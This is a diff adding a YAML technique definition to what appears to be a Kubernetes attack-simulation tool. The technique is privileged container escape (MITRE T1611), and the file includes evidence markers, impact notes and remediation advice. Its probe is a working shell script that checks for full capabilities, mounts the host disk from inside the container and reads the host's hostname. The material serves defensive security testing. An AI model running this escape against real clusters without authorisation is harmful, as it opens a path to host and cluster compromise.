@@ -1,0 +1,76 @@
+# Technique: Privileged container escape
+# ID: E1
+# Tactic: Privilege Escalation
+
+id: E1
+name: Privileged container escape
+enabled: true
+
+mitre:
+  technique_id: T1611
+  technique_name: "Escape to Host"
+  tactic: privilege-escalation
+  data_sources: [Container Logs, Process Monitoring]
+
+cis_controls:
+  - "5.2.1"
+
+severity: critical
+
+description: |
+  From inside a privileged container, mounts the host filesystem and
+  accesses host-level resources. Privileged mode disables all Linux
+  security boundaries (namespaces, capabilities, seccomp, AppArmor).
+
+execution:
+  mode: exec
+  requires_target_pod: true
+
+  probes:
+    - type: command
+      run: |
+        echo "[*] Checking privileged mode..."
+        if grep -q "CapEff:\s*0000003fffffffff" /proc/self/status 2>/dev/null; then
+            echo "PRIVILEGED_CONFIRMED"
+            echo "[*] Attempting host filesystem mount..."
+            mkdir -p /tmp/hostfs 2>/dev/null
+            if mount /dev/sda1 /tmp/hostfs 2>/dev/null || mount /dev/vda1 /tmp/hostfs 2>/dev/null; then
+                echo "HOST_FS_MOUNTED"
+                ls /tmp/hostfs/etc/hostname 2>/dev/null && echo "HOST_HOSTNAME:$(cat /tmp/hostfs/etc/hostname 2>/dev/null)"
+                umount /tmp/hostfs 2>/dev/null
+            else
+                echo "MOUNT_BLOCKED"
+            fi
+        else
+            echo "NOT_PRIVILEGED"
+        fi
+
+  evidence_markers:
+    - marker: "PRIVILEGED_CONFIRMED"
+      evidence: "Container running with full capabilities (privileged mode)"
+      impact: "All Linux security boundaries disabled"
+    - marker: "HOST_FS_MOUNTED"
+      evidence: "Host filesystem successfully mounted from container"
+      impact: "Full host compromise — read/write access to node"
+    - marker: "HOST_HOSTNAME"
+      evidence: "Read host identity from mounted filesystem"
+    - marker: "NOT_PRIVILEGED"
+      evidence: "Container is not running in privileged mode"
+    - marker: "MOUNT_BLOCKED"
+      evidence: "Host mount blocked despite privileged mode (LSM or seccomp)"
+
+success_indicators:
+  - "PRIVILEGED_CONFIRMED"
+  - "HOST_FS_MOUNTED"
+
+impact:
+  - "Full host compromise — read/write to host filesystem"
+  - "Access to all pods on the node via host PID namespace"
+  - "Credential theft from kubelet, other pods, cloud metadata"
+  - "Container escape to node = cluster compromise path"
+
+remediation: |
+  Never run containers in privileged mode. Use Pod Security Standards
+  (Baseline or Restricted) to prevent privileged pods. Deploy admission
+  controllers (Kyverno, OPA Gatekeeper) to block privileged: true.
+  If specific capabilities are needed, drop ALL and add only what's required.
